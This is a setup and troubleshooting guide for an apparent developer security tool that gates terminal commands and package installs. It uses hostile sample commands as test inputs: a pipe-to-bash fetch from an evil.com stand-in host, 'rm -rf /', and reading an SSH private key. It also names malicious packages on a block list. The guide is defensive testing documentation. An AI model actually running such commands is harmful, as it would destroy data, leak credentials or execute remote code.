# Cyravell — Setup and Troubleshooting Guide

**Platform:** Ubuntu / Linux  
**Status:** Phase 1 Foundation & Vertical Slice  

---

## 1. Prerequisites

- **Operating System:** Ubuntu 22.04 / 24.04 LTS (or compatible Linux distribution)
- **Rust Toolchain:** Stable Rust (1.80+) with `cargo` (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
- **Node.js & npm:** Node.js v18.x or v20.x, npm 9.x+
- **Visual Studio Code:** VS Code 1.80+ (`/snap/bin/code` or `.deb` installation)

---

## 2. Directory Structure

```text
cyravell/
├── Cargo.toml                  # Cargo workspace manifest
├── engine/                     # Rust security engine (daemon & library)
│   ├── Cargo.toml
│   └── src/
│       ├── lib.rs              # Library exports
│       ├── main.rs             # CLI & daemon entry point
│       ├── model.rs            # Typed schemas, JSON-RPC envelopes
│       ├── policy.rs           # Deterministic baseline policy engine
│       ├── audit.rs            # Append-only SHA-256 hash-chained audit
│       ├── integrity.rs        # Release manifest verification
│       └── ipc.rs              # Unix domain socket server (0600 permissions)
├── vscode-extension/           # TypeScript VS Code extension
│   ├── package.json            # Manifest & contributes (activity bar, commands)
│   ├── tsconfig.json
│   ├── media/cyravell-icon.svg # Custom professional vector icon
│   ├── src/
│   │   ├── extension.ts        # Activation, status bar, commands
│   │   ├── engineClient.ts     # Unix domain socket IPC client & reconnection
│   │   ├── statusView.ts       # TreeDataProvider for system health & status
│   │   ├── eventsView.ts       # TreeDataProvider for security events feed
│   │   └── eventDetailsPanel.ts# Dedicated event inspector panel
│   └── test/
│       └── client.test.js      # Extension client integration tests
├── test-harness/               # Synthetic event generation & tamper testing
│   ├── Cargo.toml
│   └── src/main.rs             # Synthetic CLI runner
├── rules/                      # Trusted security rules & release manifest
│   ├── baseline_rules.json
│   ├── schema.json
│   └── cyravell_manifest.json  # Release manifest with SHA-256 digests
├── docs/                       # Architecture, Threat Model, Protocol, Schema
│   ├── THREAT_MODEL.md
│   ├── ARCHITECTURE.md
│   ├── IPC_PROTOCOL.md
│   ├── EVENT_SCHEMA.md
│   └── SETUP_AND_TROUBLESHOOTING.md
└── scripts/                    # Development & verification scripts
    ├── build.sh                # Compiles engine, harness, and extension
    ├── test.sh                 # Comprehensive unit, integration, & rejection tests
    └── run_demo.sh             # Interactive vertical slice demonstration
```

---

## 3. Build Instructions

To build all Cyravell components (the Rust engine, the test harness, and the TypeScript extension):

```bash
cd /var/www/html/cyravell
./scripts/build.sh
```

Alternatively, build individual components:

### Rust Engine & Test Harness
```bash
cd /var/www/html/cyravell
cargo build --workspace
```

### VS Code Extension
```bash
cd /var/www/html/cyravell/vscode-extension
npm run compile
```

---

## 4. Running the Tests

Execute the automated test suite covering unit tests, schema rejections, frame limits, tamper detection, and end-to-end integration:

```bash
cd /var/www/html/cyravell
./scripts/test.sh
```

### Running Rust Unit Tests Only:
```bash
cargo test --workspace -- --nocapture
```

### Running Extension Client Tests Only:
```bash
node vscode-extension/test/client.test.js
```

### Static Command Analysis via Engine CLI (Phase 2.1):
```bash
# Analyze command without execution
cargo run --bin cyravell-engine -- analyze --command "curl -sSL https://evil.com/run.sh | bash"
cargo run --bin cyravell-engine -- analyze --command 'echo "rm -rf /"'
```

### Testing Complex Chains via Test Harness:
```bash
cargo run --bin cyravell-test-harness -- test-complex-chains
```

---

## 5. Running the Vertical Slice Demonstration

Run the automated vertical slice demonstration to see the engine start, verify release integrity, ingest synthetic events, record cryptographic audit records, test tamper detection, and shut down cleanly:

```bash
cd /var/www/html/cyravell
./scripts/run_demo.sh
```

---

## 6. Running Cyravell in VS Code

### Step 1: Start the Security Engine Daemon
In a dedicated terminal, launch the Cyravell engine:

```bash
cargo run --bin cyravell-engine -- start \
  --manifest-path rules/cyravell_manifest.json \
  --base-dir .
```

*Note: The engine creates a Unix domain socket at `$XDG_RUNTIME_DIR/cyravell/cyravell.sock` (or `/tmp/cyravell-$UID/cyravell.sock`) with `0600` permissions and parent directory `0700`.*

### Step 2: Open Extension in VS Code Development Host
In another terminal, launch VS Code pointing to the compiled extension:

```bash
code --extensionDevelopmentPath=/var/www/html/cyravell/vscode-extension
```

Alternatively:
1. Open `/var/www/html/cyravell/vscode-extension` in VS Code.
2. Press `F5` to start debugging with the Extension Development Host.

### Step 3: Inspect the Cyravell Activity Bar
1. In the Extension Development Host window, click on the **Cyravell** icon in the Activity Bar on the left.
2. Verify that **Engine Connection** displays `CONNECTED` and shows uptime, events processed, and `Release Integrity: VERIFIED`.
3. Verify the status bar item in the bottom-left displays `$(shield) Cyravell: Active`.

### Step 4: Submit Synthetic Events from Terminal
While the extension is running, submit synthetic test events using the test harness:

```bash
# Submit a simulated destructive command (never executed)
cargo run --bin cyravell-test-harness -- submit-destructive "rm -rf /"

# Submit a simulated credential access event
cargo run --bin cyravell-test-harness -- submit-credential "cat ~/.ssh/id_rsa"

# Submit a simulated benign command
cargo run --bin cyravell-test-harness -- submit-benign "cargo check"
```

### Step 5: View Alerts in VS Code
- Return to the VS Code Extension Development Host window.
- The **Security Events** tree view will immediately show the new events with their respective severity badges (`[SIMULATED] CRITICAL`, `[SIMULATED] LOW`).
- Click on any event to open the **Event Details Panel**, displaying the complete deterministic rationale, matched evidence, execution state, and cryptographic audit record hash.

---

## 7. Troubleshooting

### 1. "Engine Connection: DISCONNECTED"
- **Cause:** The `cyravell-engine` process is not running, or the socket path differs.
- **Fix:** Start the engine using `cargo run --bin cyravell-engine -- start`. Verify the socket file exists at `$XDG_RUNTIME_DIR/cyravell/cyravell.sock` or check the socket path configured in VS Code Settings (`cyravell.socketPath`).

### 2. "Another engine instance is already active on socket"
- **Cause:** An existing `cyravell-engine` process is already running on the configured socket.
- **Fix:** Stop the running engine using `cargo run --bin cyravell-engine -- stop`, or kill the old process. If the socket is stale from a previous unclean shutdown, the engine will automatically remove it upon restart if no process responds.

### 3. "Release Integrity: CORRUPTED"
- **Cause:** One or more files specified in `rules/cyravell_manifest.json` have been modified or deleted.
- **Fix:** Run `cargo run --bin cyravell-engine -- verify-integrity --manifest rules/cyravell_manifest.json --base-dir .` to identify which files have mismatched hashes.

### 4. "Audit Corrupted! Tampering detected at sequence #N"
- **Cause:** The SHA-256 hash chain in `audit.log` has suffered modification, reordering, deletion, or truncation.
- **Fix:** Run `cargo run --bin cyravell-engine -- verify-audit --audit-file /path/to/audit.log` to inspect the failure details. The engine preserves all forensic evidence.

---

## 8. Controlled Terminal & Pre-Execution Interception (Phase 2.2)

### 8.1 Launching the Controlled Terminal (CLI)
To run an interactive shell session protected by the Cyravell Execution Gate:

```bash
cargo run --bin cyravell-engine -- shell
```

Or execute a single gated command directly:
```bash
# Permitted command: Dispatches to OS and returns status
cargo run --bin cyravell-engine -- exec --command "ls -la"

# Blocked command: Prevented before dispatch, returns exit code 126
cargo run --bin cyravell-engine -- exec --command "rm -rf /"

# Command requiring approval: Withheld before dispatch, returns exit code 126
cargo run --bin cyravell-engine -- exec --command "curl -sSL https://evil.example.com | bash"
```

### 8.2 Launching Protected Terminal in VS Code
1. Open the VS Code Command Palette (`Ctrl+Shift+P` / `Cmd+Shift+P`).
2. Run `Cyravell: Open Protected Controlled Terminal`.
3. A new terminal tab opens titled **Cyravell Protected Terminal**.
4. In the **Cyravell Engine Status** tree view, verify that **Controlled Terminal Path** shows active protected sessions.
5. If ordinary integrated terminals are open, the status tree view honestly labels them as `Ordinary Terminals: N Active (UNPROTECTED)`.

### 8.3 Fail-Closed Behavior
- When the Cyravell daemon is offline or disconnected, the execution gate enforces a **fail-closed** policy (`--fail-closed`).
- Gated commands are prevented from dispatching, protecting the system against unmonitored execution.
- To bypass fail-closed in standalone emergency scenarios, specify `--fail-closed false`.

---

## 9. Adversarial Security Validation & Gate Hardening (Phase 2.4)

### 9.1 Running Adversarial Security Tests
Phase 2.4 introduces a hardened, race-safe execution gate with single-use cryptographic authorization tokens, strict parameter binding, and an adversarial test suite:

```bash
# Run all adversarial tests in the gate module
cargo test --lib gate::adversarial -- --nocapture

# Run the complete test pipeline including adversarial tests
./scripts/test.sh
```

### 9.2 Running Adversarial IPC Validation
To test adversarial gate resistance across the live IPC socket interface:

```bash
cargo run --bin cyravell-test-harness -- test-adversarial-gate
```

This verifies resistance against:
1. **Approval Bypass Attempts (Category A):** Fabricated tokens, missing tokens, expired tokens, session tampering, and command tampering (TOCTOU).
2. **Replay & Duplicate Requests (Category B):** Token reuse prevention, duplicate decide rejection, and serial dispatch deduplication.
3. **Race Conditions & Concurrency (Category C):** Multi-threaded races (Approve vs Deny, Approve vs Cancel, 8 concurrent threads racing for 1 token).
4. **Failure & Recovery (Category D):** Token invalidation on engine restart, failed backend execution handling, and fail-closed offline enforcement.
5. **Boundary & Input Validation (Category E):** Null bytes in commands/IDs, oversized commands (>64KB), and empty commands.

### 9.3 Reviewing Pending Approvals in VS Code
1. Open the VS Code Command Palette (`Ctrl+Shift+P` / `Cmd+Shift+P`).
2. Run `Cyravell: Review Pending Command Approvals`.
3. If commands are pending approval, a QuickPick list opens displaying the command, severity, and matched security rule.
4. Select a command and choose **Approve**, **Deny**, or **Cancel**.
5. Once decided, the single-use authorization token is handled securely by the engine, and the decision is permanently recorded in the cryptographic audit log.

---

## 10. Pre-Installation Package Security Enforcement (Phase 2.5)

### 10.1 Overview & Supported Package Managers
Phase 2.5 adds pre-installation package security analysis directly into the execution gate. Before a package installation command runs, Cyravell statically analyzes the command, inspects local manifests and lockfiles, checks against a local advisory database, and authoritatively halts dangerous operations.

Supported package managers and tools:
- **npm / npx:** `npm install`, `npm add`, `npm update`, `npx <pkg>`
- **pnpm:** `pnpm add`, `pnpm install`, `pnpm update`
- **Yarn:** `yarn add`, `yarn install`, `yarn upgrade`
- **pip / pip3 / python -m pip:** `pip install <pkg>`, `pip install -r requirements.txt`
- **Cargo:** `cargo add <pkg>`, `cargo install <pkg>`, `cargo update`
- **Wrappers:** `sudo npm install ...`, `env pnpm add ...`

### 10.2 Gate Enforcement Rules
1. **Hard Block on Confirmed Malicious Packages:**
   - Packages flagged as known malicious (e.g. `flatmap-stream`, `node-ipc`, `cross-env.js`, `colorama-v2`, `rust-crypto-wasm`) are blocked with **zero backend invocations**.
   - This block is non-overridable: no approval request is generated, and attempting to dispatch it fails closed.
2. **Interactive Approval on Known Vulnerabilities:**
   - Packages with known high-severity CVEs (e.g., `lodash@4.17.20`) require explicit developer approval before dispatch.
3. **Lockfile & Manifest Integrity Checks:**
   - Unpinned dependencies, manifest-lockfile mismatches, or malformed lockfiles trigger `REQUIRE_APPROVAL` with actionable diagnostic reasons.
4. **TOCTOU Protection:**
   - The engine computes a SHA-256 fingerprint over manifest and lockfiles at assessment time. If a file is modified between review and dispatch, `dispatch_authorized` rejects execution with error `-32005`.
5. **No False Claims of Safety:**
   - A clean dependency check returns `CleanNoMatches` and clearly states: *"No known advisory matches found (static assessment does not guarantee absence of 0-days)"*.

### 10.3 Running Package Security Tests
```bash
# Run unit and mock gate tests for package inspection
cargo test --lib package::tests -- --nocapture

# Run the live IPC package security test suite via test harness
cargo run --bin cyravell-test-harness -- test-package-gate
```

### 10.4 Troubleshooting Package Security Errors
- **Error: `Project manifest or lockfile modified after approval was granted (TOCTOU detected)` (-32005):**
  - **Cause:** `package.json`, `package-lock.json`, `Cargo.toml`, or `requirements.txt` was altered after the user approved the pending command.
  - **Resolution:** Re-run the command in the controlled terminal to generate a fresh approval request matching the current workspace state.
- **Error: `Package is confirmed malicious - gate hard-block cannot be overridden` (-32004):**
  - **Cause:** The requested package is an active backdoor or supply chain attack.
  - **Resolution:** Remove the malicious dependency from the install command or manifest. Do not bypass security controls.
- **Warning: `Lockfile mismatch: package X declared in manifest but missing from lockfile`:**
  - **Cause:** A dependency was added to `package.json` or `Cargo.toml` manually without updating the corresponding lockfile.
  - **Resolution:** Run the appropriate lockfile update command (e.g. `npm install --package-lock-only` or `cargo check`) under developer review.

---

## 11. Post-Installation Verification & Dependency-Drift Monitoring (Phase 2.6)

### 11.1 Establishing and Inspecting Baselines
A dependency baseline records a canonical snapshot of a project's dependency topology, manifest hashes, and lockfile integrity attributes.

#### Using VS Code
1. Open the Command Palette (`Ctrl+Shift+P` / `Cmd+Shift+P`).
2. Run `Cyravell: Create Dependency Baseline`.
3. Check the **Cyravell Engine Status** panel under **Dependency Baseline** to view the ecosystem, trust state, and fingerprint.

#### Using IPC / CLI
```bash
# Snapshot a baseline via test harness or IPC
cargo run --bin cyravell-test-harness -- test-drift-monitor
```

### 11.2 Checking for Dependency Drift
To verify current workspace dependencies against the trusted baseline:
1. In VS Code, run `Cyravell: Check Dependency Drift` from the Command Palette.
2. If drift is detected, a notification lists the affected packages and severities, and the status item updates to show finding counts.

### 11.3 Running Phase 2.6 Tests
```bash
# Run unit and subsystem drift & baselining tests (20 dedicated tests)
cargo test --lib package::drift_tests -- --nocapture

# Run the live IPC drift monitoring test suite
cargo run --bin cyravell-test-harness -- test-drift-monitor

# Run full end-to-end pipeline
./scripts/test.sh
```

### 11.4 Troubleshooting Baseline & Drift Errors
- **Error: `Execution gate blocked: workspace has active malicious dependency drift` (-32006 / exit 126):**
  - **Cause:** A confirmed malicious package (e.g. `flatmap-stream`) was detected in the active workspace files during background monitoring or post-operation verification.
  - **Resolution:** Remove the malicious dependency from `package.json` and lockfiles. Then run `Cyravell: Check Dependency Drift` to reconcile the workspace back to a clean state.
- **Error: `Cannot replace VerifiedApproved baseline with unverified state without explicit approval`:**
  - **Cause:** An automatic background event attempted to downgrade or overwrite an approved baseline with an unreviewed snapshot (`UNVERIFIED_INITIAL` or `REVIEW_REQUIRED`).
  - **Resolution:** The engine's trust boundary invariant prevents unverified changes from erasing verified baselines. Explicitly trigger a baseline creation or approve the drift report after verifying the dependencies.
- **Notice: `Observed via local filesystem reconciliation (unattributed background change)` in Audit Logs:**
  - **Explanation:** Filesystem monitoring detects *that* a manifest or lockfile was modified, but does not fabricate false attribution to a process without an active controlled terminal context. This is expected behavior and upholds Cyravell's attribution honesty principle.

---

## 12. Advisory Intelligence Updates & Rollback Protection (Phase 2.7)

Cyravell Phase 2.7 enables secure, offline, cryptographically verifiable updates for vulnerability and malicious package intelligence.

### 12.1 Querying Advisory Database Status
```bash
# Query active advisory database status (works whether engine daemon is live or offline)
cyravell-engine advisory status
```
Output displays:
- Active version and format version.
- Provenance source (`Embedded`, `LocalFile`, or `ImportedBundle`).
- Publisher and signing key identifier.
- Total advisories, malicious packages, and vulnerabilities.
- Counts grouped by severity and package ecosystem.

### 12.2 Inspecting and Verifying Advisory Bundles
Before importing an advisory update, developers can safely inspect metadata, verify the cryptographic signature, and compute differences against the active database:

```bash
# Inspect bundle metadata, validity, and difference counts without applying:
cyravell-engine advisory inspect /path/to/advisory-bundle.json

# Cryptographically verify the Ed25519 signature against trusted keys:
cyravell-engine advisory verify /path/to/advisory-bundle.json

# Verify using an explicit custom keystore:
cyravell-engine advisory verify /path/to/advisory-bundle.json --keys /path/to/custom_keys.json

# Display granular line-by-line additions, modifications, and deletions:
cyravell-engine advisory diff /path/to/advisory-bundle.json
```

### 12.3 Importing and Activating an Advisory Bundle
```bash
# Import and activate (online notifies running daemon over IPC; offline updates local file)
cyravell-engine advisory import /path/to/advisory-bundle.json

# Force import of an older or equal version (rollback override):
cyravell-engine advisory import /path/to/advisory-bundle.json --allow-rollback
```

### 12.4 Using the VS Code Extension
1. Open the Command Palette (`Ctrl+Shift+P` / `Cmd+Shift+P`).
2. Run `Cyravell: Inspect Advisory Bundle` to select and review a candidate bundle.
3. Run `Cyravell: Import Advisory Bundle` to validate and activate the bundle. If a rollback is detected, VS Code displays a modal confirmation prompt.
4. Check **Advisory Intelligence** under the **Cyravell Engine Status** panel in the activity bar.

### 12.5 Public Key Provisioning & Trust Store
Trusted public signing keys are configured in `rules/trusted_keys.json`:
```json
{
  "version": "1.0",
  "keys": [
    {
      "key_id": "cyravell-sec-official-2026",
      "publisher": "Cyravell Security Intelligence Team",
      "public_key_hex": "68b910547a547804e106aa41612d1deb43f5857a1b82a9d586ac49a245699278",
      "created_at": "2026-01-01T00:00:00Z",
      "expires_at": null,
      "is_active": true
    }
  ]
}
```
- **Adding Keys:** Add entries with the publisher name and 64-character hex-encoded Ed25519 public key.
- **Key Revocation:** Set `"is_active": false` or set `"expires_at"` to an RFC 3339 timestamp.

### 12.6 Troubleshooting Advisory Update Errors
- **Error: `Signature validation error: Key ID '...' not found in trusted key store`:**
  - **Cause:** The candidate bundle was signed with a key identifier not present in `rules/trusted_keys.json`.
  - **Resolution:** Verify the bundle publisher. If legitimate, add their public key to `rules/trusted_keys.json`.
- **Error: `Rollback rejected: candidate database version ... is not strictly newer than active version ...`:**
  - **Cause:** Cyravell's anti-rollback protection rejects candidate bundles that are older than or equal to the current active version or monotonic high-water mark.
  - **Resolution:** If a rollback is intentional (e.g., reverting a bad upstream release), specify `--allow-rollback` via CLI or confirm the prompt in VS Code. Note that existing active hard blocks and malicious package tombstones are permanently preserved even across rollbacks.
- **Error: `Advisory payload digest mismatch`:**
  - **Cause:** The advisory records in the bundle do not match the signed SHA-256 `payload_digest`. The file was modified or corrupted in transit.
  - **Resolution:** Re-download or obtain an authentic, uncorrupted bundle from the publisher.
- **Error: `Synthetic test fixture contamination detected: record '...' has is_synthetic=true in production bundle`:**
  - **Cause:** A development or test fixture record was accidentally included in a production bundle.
  - **Resolution:** Re-export the bundle with `is_synthetic: false` on all production advisory entries.

### 12.7 Trust Store Security, Permissions, and Symlinks (Phase 2.8)
- **Symlinks Forbidden:** `rules/trusted_keys.json` must be a real regular file. Symbolic links are strictly rejected (`KeyStoreError::SymlinkForbidden`) to prevent symlink redirect attacks.
- **Insecure Permissions:** On Unix systems, the trust store must not be world-writable (`mode & 0o002 == 0`). If permissions are insecure, loading fails with `KeyStoreError::InsecurePermissions`.
- **Explicit Corruption Status:** If `rules/trusted_keys.json` is corrupted or malformed, the engine marks the trust store as corrupted and fails closed on all signature verifications. It never silently falls back to embedded keys when the on-disk file is damaged.

### 12.8 Troubleshooting Adversarial Trust & Hardening Errors
- **Error: `Duplicate JSON key detected: '...'`:**
  - **Cause:** The candidate bundle or trust store contains duplicate keys in a JSON object.
  - **Resolution:** Regenerate the bundle or trust store using standard canonical JSON tools without duplicate keys.
- **Error: `Trust store path '...' is a symbolic link`:**
  - **Cause:** `rules/trusted_keys.json` is a symlink.
  - **Resolution:** Replace the symlink with a regular file containing genuine trusted public keys (`chmod 644 rules/trusted_keys.json`).
- **Error: `Trust store path '...' is world-writable`:**
  - **Cause:** File permissions allow arbitrary local write access.
  - **Resolution:** Restrict permissions: `chmod 644 rules/trusted_keys.json`.
- **Error: `Rollback override rejected: unauthenticated or unconfirmed rollback attempt over IPC` (Code `-32008`):**
  - **Cause:** An IPC client specified `allow_rollback: true` without supplying the mandatory `rollback_confirmation_token: "CONFIRM_ADVISORY_ROLLBACK"`.
  - **Resolution:** Pass `--allow-rollback` via CLI, or ensure the IPC request explicitly includes `rollback_confirmation_token: "CONFIRM_ADVISORY_ROLLBACK"`.




